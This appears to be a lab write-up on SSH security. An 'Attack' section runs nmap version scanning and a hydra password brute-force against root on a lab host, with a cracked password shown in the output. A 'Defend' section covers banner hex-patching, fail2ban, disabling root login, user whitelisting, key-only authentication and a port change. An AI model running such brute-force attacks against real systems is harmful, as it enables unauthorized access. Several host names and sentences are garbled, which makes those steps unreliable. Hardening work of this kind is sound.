# Attack

## SSH Version Discovery

Check if mac.hx.is reachable:

```bash
ping -c3 demo.hx.local
```

Run fast nmap service scan:

```bash
nmap -sV -F demo.hx.local
```

Results will be like:

```bash
Nmap scan report for demo.hx.local (10.2.29.83)
Host is up (0.0035s latency).
Not shown: 98 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3389/tcp open  ms-wbt-server xrdp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see OpenSSH 8.2p1 on Ubuntu server

## SSH Bruteforce

During the ping scan for demo.hx.local, we found the IP address:

```bash
ping -c3 demo.hx.local

10.2.29.83
```

Now we run hydra with a custom wordlist for bruteforcing ssh password for user `root` :

```bash
hydra -l root -P /root/Desktop/wordlists/passwords.txt 10.2.29.83 ssh
```

We find the following results:

```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 90 login tries (l:1/p:90), ~6 tries per task
[DATA] attacking ssh://10.2.29.83:22/
[22][ssh] host: 10.2.29.83   login: root   password: abc_123321!@@@
1 of 1 target successfully completed, 1 valid password found
```


# Defend

## Hide OpenSSH version from nmap scans

We will edit the version details by editing sshd binary using hexedit and remove OpenSSH version string or even the name from the binary itself, aka binary patching:

```bash
cp /usr/sbin/sshd /tmp/
hexedit /tmp/sshd
```

Press `TAB` to access ASCII side of the hex editor and `CTRL+S` to search for string value, then type `OpenSSH` and Enter.

Rewrite the entire .hx.with `....` and press `CTRL+X` to save and exit. Press `Y` to confirm save and exit. Now replace the original sshd binary with patched binary:

```bash
cp /usr/sbin/sshd ~/Desktop/sshd_original.bak
cp /tmp/sshd /usr/sbin/
sudo service ssh restart
```

## Bruteforce Prevention - Fail2Ban

Enable fail2ban service:

```bash
systemctl enable fail2ban
```

Start fail2ban service:

```bash
systemctl start fail2ban
```

Check sshd jail status:

```bash
fail2ban-client status
```

## Block `root` Login

We will edit `sshd_config` file.
- Create a copy/backup of the config
- Change `PermitRootLogin` to `no` in config
- Restart ssh service

```bash
cp /etc/ssh/sshd_config /etc/ssh/sshd_config_original
nano /etc/ssh/sshd_config
service ssh restart
```

Trying to access as root for attacker will result in:

```bash
root@attackdefense:~# ssh root@10.2.29.83
The authenticity of host '10.2.29.83 (10.2.29.83)' can't be established.
ED25519 key fingerprint is SHA256:G5+SrVcs5gYpA7b/LGXMSF3pIYlBN2BdtZU0dJHkSy8.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.2.29.83' (ED25519) to the list of known hosts.
root@10.2.29.83's password: 
Permission denied, please try again.
```

## Whitelist User Access

Only certain users will be allowed to login via to ssh. We create new users in the mac.hx.using:

```bash
adduser john
adduser david
```

Allow users against ssh IP address inside ssh config.
- Create a copy/backup of the config
- Allowusers addition: `AllowUsers john@10.2.29.83 someother@192.158.1.38`
- Restart ssh service

```bash
cp /etc/ssh/sshd_config /etc/ssh/sshd_config_original
nano /etc/ssh/sshd_config
service ssh restart
```

Notice that david is not allowed against the IP.

## SSH Keys instead of Passwords

On legit user mac.hx.generate a ssh key:

```bash
ssh-keygen
```

Login to john@10.2.29.83 ssh account:

```bash
ssh john@10.2.29.83
```

Copy the generated key to ssh mac.hx.

```bash
ssh-copy-id john@10.2.29.83
```

Perform SSH login again and login without password. Now we remove password authenticated completely from sshd_config on ssh server:

```bash
nano /etc/ssh/sshd_config
```

Set options:

```bash
PasswordAuthentication no
PubkeyAuthentication yes
```

## Change Default Port

Open sshd config and change port number to 2222 or anything else:

```bash
nano /etc/ssh/sshd_config
```

Change Option:

```bash
#Port 22
Port 2222
```
